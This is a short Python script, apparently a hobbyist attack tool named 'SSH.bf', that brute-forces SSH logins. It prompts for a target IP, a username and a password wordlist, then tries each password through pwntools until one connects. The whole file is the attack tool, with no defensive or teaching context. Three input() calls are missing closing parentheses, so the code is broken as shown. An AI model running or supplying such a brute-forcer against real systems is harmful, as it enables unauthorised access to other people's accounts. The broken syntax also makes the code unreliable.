from pwn import *
from art import *
import paramiko

tprint("SSH.bf",font="random")    #Banner

host = input("Enter the IP: "
username =input("Enter the username: "
attempts = 0


file = input("Enter the password dictionary file path: "
with open(file, "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=.5)
            if response.connected():
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempts += 1
